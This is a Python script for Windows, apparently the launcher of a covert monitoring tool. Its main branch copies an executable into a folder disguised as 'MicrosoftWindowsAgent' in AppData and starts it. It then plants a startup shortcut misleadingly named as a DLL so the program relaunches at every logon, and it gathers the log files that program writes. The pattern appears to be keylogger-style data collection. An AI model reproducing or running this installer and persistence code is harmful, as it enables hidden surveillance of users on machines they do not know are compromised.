from Colors import color
from os import system as cmd
from os import getenv,path, listdir
from time import sleep
import win32com.client
from Colors import text

# Text Samples
which_app = text.which_app
shell_simbol = text.shell_simbol
wrong_value = text.wrong_value
version = text.version
user_text = text.user_text

# Create Shortcut

file_local_save = getenv('APPDATA')
def create_file_shortcut(file_path, shortcut_name=None):
    # Initialize the Windows Shell
    shell = win32com.client.Dispatch("WScript.Shell")
    # Get the path to the desktop

    desktop = file_local_save+r"\Microsoft\Windows\Start Menu\Programs\Startup"

    # Set the name of the shortcut and the full path where it will be created
    if not shortcut_name:
        shortcut_name = path.basename(file_path)  # Use the original file name if no name is provided
    shortcut_path = path.join(desktop, shortcut_name + ".lnk")

    shortcut = shell.CreateShortcut(shortcut_path)

    shortcut.TargetPath = file_path

    shortcut.WorkingDirectory = path.dirname(file_path)

    shortcut.save()

# Choosing

cmd("cls")
print(user_text)
option = str(input(f"{which_app}\n{shell_simbol}"))
if option == '0':
    cmd("cls")
    cmd("Prompt.exe")
elif option == '1':
    cmd("cls")
    cmd("Sounds.exe")
elif option == '2':
    cmd("cls")
    print(rf"{color.fg.cyan}Copy log file? {color.reset}{color.type.Black}[Y\n]{color.reset}")
    opt = str(input(f"\n {shell_simbol}"))
    if opt.capitalize().strip() == "Y":
        if path.isfile(rf"%appdata%\MicrosoftWindowsAgent\\log.txt"):
            cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log.txt %appdata%\MicrosoftWindowsAgent\\log000.txt")
        if not path.exists(r".\logs"):
            cmd(r"mkdir .\logs")
        path_dir = "logs\\"
        arquivos = [f for f in listdir(path_dir) if path.isfile(path.join(path_dir,f))]

        for arquivo in arquivos:
            lista = arquivo.split()
            for nome in lista:
                if nome.startswith("log"):
                    number = int(nome[3:6]) + 1
                    if number >= 1000:
                        print("excede o maximo de arquivos")
                    else:
                        file_name = f"{number:03}"  # Formata o número com 3 dígitos, preenchendo com zeros à esquerda
                        file_name = "log"+str(file_name)+".txt"
                        cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log000.txt .\logs\{file_name} ")

        cmd(rf"copy %appdata%\MicrosoftWindowsAgent\\log000.txt .\logs ")

    if not path.exists(f"{file_local_save}\MicrosoftWindowsAgent\\log.txt"):
        cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
        cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
        cmd(rf"copy agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
        cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
        create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
        cmd("exit")
else:
    print(f"{wrong_value}")
    print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
    sleep(10)
    exit(1)